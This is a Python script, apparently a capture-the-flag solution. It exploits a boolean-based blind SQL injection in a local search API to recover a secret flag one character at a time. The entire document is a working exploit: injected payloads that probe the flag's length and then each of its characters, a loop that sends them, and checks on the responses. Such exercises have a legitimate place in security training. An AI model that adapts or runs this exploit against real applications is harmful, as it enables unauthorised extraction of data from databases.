import requests
import string

def solve():
    """
    Exploits a boolean-based blind SQL injection to exfiltrate a flag from the database.
    The script first determines the length of the flag and then exfiltrates it character by character.
    """
    # Hardcoded target URL as required
    target_url = "http://localhost:3000/api/search"

    # The character set to test for the flag, based on the exploitation plan
    charset = string.ascii_lowercase + string.digits + "{}-"

    # --- Step 1: Determine the length of the flag ---
    flag_length = 0
    print("[-] Starting exploit: Determining the length of the flag...")

    # We'll test for lengths from 1 to 50, which should be a reasonable upper bound.
    for i in range(1, 51):
        # SQL injection payload to test for the length of the secret_value
        payload = f"' OR (SELECT length(secret_value) FROM secrets WHERE secret_key = 'flag') = {i} --"
        json_payload = {"name": payload}

        try:
            response = requests.post(target_url, json=json_payload)
            # Print the raw response text for every request as required
            print(response.text)
            
            # The success condition is finding '{"found":true}' in the response
            if '{"found":true}' in response.text:
                flag_length = i
                print(f"[+] Successfully determined flag length: {flag_length}")
                break
        except requests.exceptions.RequestException as e:
            print(f"[!] Critical error connecting to the server: {e}")
            return

    if flag_length == 0:
        print("[!] Failed to determine the flag length. The exploit cannot continue.")
        return

    # --- Step 2: Exfiltrate the flag character by character ---
    exfiltrated_flag = ""
    print(f"[-] Exfiltrating the flag, which has a length of {flag_length} characters...")

    # Iterate through each position of the flag string
    for pos in range(1, flag_length + 1):
        found_char_in_pos = False
        # Iterate through each possible character for the current position
        for char in charset:
            # SQL injection payload to guess the character at the current position
            payload = f"' OR (SELECT substr(secret_value, {pos}, 1) FROM secrets WHERE secret_key = 'flag') = '{char}' --"
            json_payload = {"name": payload}

            try:
                response = requests.post(target_url, json=json_payload)
                # Print the raw response text for every request as required
                print(response.text)

                if '{"found":true}' in response.text:
                    exfiltrated_flag += char
                    print(f"[+] Character found at position {pos}: '{char}'. Current flag: {exfiltrated_flag}")
                    found_char_in_pos = True
                    break  # Character found, move to the next position
            except requests.exceptions.RequestException as e:
                print(f"[!] Critical error connecting to the server: {e}")
                return
        
        if not found_char_in_pos:
            print(f"[!] Could not determine character at position {pos}. The charset may be incomplete.")
            print(f"[!] Partial flag found: {exfiltrated_flag}")
            return

    # --- Step 3: Final Output ---
    if len(exfiltrated_flag) == flag_length:
        print(f"\\n[SUCCESS] The full flag has been exfiltrated: {exfiltrated_flag}")
    else:
        print(f"\\n[!] Exploit finished, but the result may be incomplete.")
        print(f"[!] Final result: {exfiltrated_flag}")

# Execute the exploit
solve()
